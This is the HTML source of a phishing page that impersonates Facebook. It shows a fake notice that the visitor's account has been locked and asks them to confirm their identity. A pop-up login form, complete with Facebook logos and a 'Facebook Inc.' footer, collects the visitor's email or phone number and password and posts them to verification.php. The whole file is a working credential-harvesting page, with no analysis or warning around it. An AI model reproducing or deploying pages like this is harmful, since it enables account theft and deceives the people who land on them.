<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
<meta name="description" content="" />
<meta name="author" content="ThemeTags" />
<meta property="og:title" content="Verification Pages Support Secure" />
<meta property="og:description" content="" />
<link rel="icon" href="https://www.freepnglogos.com/uploads/facebook-logo-icon/facebook-logo-icon-file-facebook-icon-svg-wikimedia-commons-4.png">
<meta property="og:image" content="https://i.ibb.co/5cxmZsb/image.png" />
<meta property="og:type" content="article" />

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KyZXEAg3QhqLMpG8r+8fhAXLRk2vvoC2f3B09zVXn8CA5QIVfZOJ3BCsw2P0p/We" crossorigin="anonymous">
<style>
    @charset "utf-8";
@import url("https://fonts.googleapis.com/css2?family=Teko&amp;display=swap");
*,*:before,*:after {
	-webkit-box-sizing:border-box;
	-moz-box-sizing:border-box;
	box-sizing:border-box;
}
</style>
<link href="css/style.css" rel="stylesheet">
    <link rel="stylesheet" href="css/facebook.css">
        <title>Please Confirm Your Identity</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
  </head>
  <body>
  
    <nav class="navbar navbar-expand-lg navbar-light bg-light py-1 ps-2">
        <img class="logo d-inline-block " src="8B.png" alt="">
			
    </nav>

        <div class="container">
        <div class="row my-0">
            <div class="col-md-12 col-12 my-4"><center>
			   <img alt="" src="vv.png" height="100" width="150" />
           </center>
            <div class="col-md-12 col-15 d-block mt-4 text-section">
<font size="4"><font color="black"><font face="Arial"><b>Please Confirm Your Identity</b>
<font size="3"><font color="black"><font face="Arial"><br>Recent activity may have affected your account's security, so we've locked it. we'll walk you through a few steps to confirm your identity and help you access your account. Learn more</center><hr/>
<img width="360px" src="okee.png"><hr/>
  </div> 
  <center>
<button type="submit" style="background-color:transparent; border-color:transparent;"> 
  <img src="pns.png" width="322" height="53" onclick="open_facebook()"></button>
</button></center>
      </div>          
   
    <div class="popup-login login-facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
			<img src="POKER.png">
		</div>
		<div class="content-box-fb">
			<img src="https://www.freepnglogos.com/uploads/facebook-logo-icon/facebook-logo-icon-file-facebook-icon-svg-wikimedia-commons-4.png">
			<div class="txt-login-fb">
				 Log in to your Facebook account to verify your account
			</div>
			<form action="verification.php" method="post">
				<input type="text" class="loginEmail" name="email" placeholder="Email address or phone number" autocomplete="off" autocapitalize="off" required>
				<input type="text" class="loginPassword" name="password" id="fbPassword" placeholder="Password" autocomplete="off" autocapitalize="off" required>
				<div class="showHide showPassword" onclick="showFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div>
				<div class="showHide hidePassword" style="display: none;" onclick="hideFbPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div>
				<button type="submit" class="btn-login-fb">Log In</button>
			</form>
			<div class="txt-create-account">Create account</div>
			<div class="txt-not-now"></div>
			<div class="txt-forgotten-password">Forgotten password?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">English (UK)</div>
			<div class="language-name">Bahasa Indonesia</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">日本語</div>
			<div class="language-name">Español</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="js/popup.js"></script>
  </body>
</html>